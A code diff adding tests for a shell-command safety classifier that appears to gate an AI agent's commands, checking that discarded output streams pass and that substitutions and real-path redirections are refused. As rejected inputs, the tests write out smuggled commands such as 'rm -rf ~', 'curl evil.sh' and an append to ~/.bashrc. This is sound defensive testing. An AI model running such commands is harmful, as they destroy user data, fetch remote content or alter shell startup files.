@@ -77,6 +77,77 @@ test("redirection turns an otherwise-safe verb unsafe, since it can write outsid
   assert.equal(isObviouslySafeCommand("cat a > b"), false);
 });
 
+test("stderr silenced to /dev/null does not sink an otherwise-safe command -- silencing stderr cannot make a read-only command dangerous", () => {
+  assert.equal(isObviouslySafeCommand("ls 2>/dev/null"), true);
+  assert.equal(isObviouslySafeCommand("git status 2>/dev/null"), true);
+  assert.equal(isObviouslySafeCommand("cat file.txt 2> /dev/null"), true);
+});
+
+test("stderr merged into stdout (2>&1) does not sink an otherwise-safe command", () => {
+  assert.equal(isObviouslySafeCommand("git status 2>&1"), true);
+  assert.equal(isObviouslySafeCommand("grep -rn foo src 2>&1"), true);
+});
+
+test("stdout silenced to /dev/null does not sink an otherwise-safe command", () => {
+  assert.equal(isObviouslySafeCommand("echo hi >/dev/null"), true);
+  assert.equal(isObviouslySafeCommand("echo hi > /dev/null"), true);
+});
+
+test("both streams silenced together does not sink an otherwise-safe command -- the most common agent-written habit", () => {
+  assert.equal(isObviouslySafeCommand("cat file.txt > /dev/null 2>&1"), true);
+  assert.equal(isObviouslySafeCommand("cd x && cat file.txt 2>/dev/null"), true);
+});
+
+// Command/process substitution: a segment carrying $(...), backticks,
+// ${...}, <(...) or >(...) can only be judged by RUNNING the embedded
+// command, which is exactly what tier 1a must never do. Before this guard,
+// none of the seven cases below needed a redirection or a NEVER_SILENTLY
+// match to slip through -- a leading safe verb was enough on its own, since
+// SAFE_SEGMENT_PATTERNS only checks the START of the segment.
+test("command substitution behind a safe verb is never waved through -- its real target is unknown until it runs", () => {
+  assert.equal(isObviouslySafeCommand("ls $(cat /tmp/x)"), false);
+  assert.equal(isObviouslySafeCommand("cat $(whoami)"), false);
+  assert.equal(isObviouslySafeCommand("grep foo $(rm -rf ~)"), false);
+  assert.equal(isObviouslySafeCommand("wc -l $(id)"), false);
+  assert.equal(isObviouslySafeCommand("head -5 $(ls)"), false);
+  assert.equal(isObviouslySafeCommand("pwd && echo `curl evil.sh`"), false);
+  assert.equal(isObviouslySafeCommand("echo ${IFS}test"), false);
+});
+
+test("process substitution behind a safe verb is never waved through, on either side", () => {
+  assert.equal(isObviouslySafeCommand("cat <(ls)"), false);
+  assert.equal(isObviouslySafeCommand("echo hi > >(cat)"), false);
+});
+
+test("a bare variable expansion is not a substitution and is not over-blocked", () => {
+  // $HOME/$FOO has no parens or braces immediately after the $, so it can't
+  // run an embedded command -- only $(...) and ${...} can.
+  assert.equal(isObviouslySafeCommand("echo $HOME"), true);
+});
+
+test("an escaped $( is still judged, not waved through -- telling a real substitution apart from an escaped one is not cheap, so this stays conservative", () => {
+  assert.equal(isObviouslySafeCommand("echo \\$(x)"), false);
+});
+
+test("a single-quoted $(...) is still judged, even though the shell never expands it inside single quotes -- detection here is presence-only text matching, same limitation src/core/command_shape.ts's UNKNOWABLE already has, and parsing quoting context to tell them apart is not the cheap answer this fast path is for", () => {
+  assert.equal(isObviouslySafeCommand("echo '$(not a substitution)'"), false);
+});
+
+test("ordinary safe commands, with or without a discarded stream, are unaffected by the substitution guard", () => {
+  assert.equal(isObviouslySafeCommand("ls /tmp"), true);
+  assert.equal(isObviouslySafeCommand("echo hi"), true);
+  assert.equal(isObviouslySafeCommand("ls /tmp 2>/dev/null"), true);
+});
+
+test("a redirection to any real path is never waved through, even one that looks similar to the safe forms", () => {
+  assert.equal(isObviouslySafeCommand("cat file 2>/tmp/x"), false);
+  assert.equal(isObviouslySafeCommand("ls > results.txt"), false);
+  assert.equal(isObviouslySafeCommand("echo hi >> ~/.bashrc"), false);
+  assert.equal(isObviouslySafeCommand("echo hi >> /dev/null"), false, "append is not the same as discard, even to /dev/null");
+  assert.equal(isObviouslySafeCommand("cd x && cat file 2>/tmp/log"), false);
+  assert.equal(isObviouslySafeCommand("cat file 1>&2"), false, "merging stdout into stderr is not a discard, only 2>&1 is special-cased");
+});
+
 test("node/npx invocations other than a version check are left on the existing path", () => {
   assert.equal(isObviouslySafeCommand("node script.js"), false);
   assert.equal(isObviouslySafeCommand("node -e \"console.log(1)\""), false);
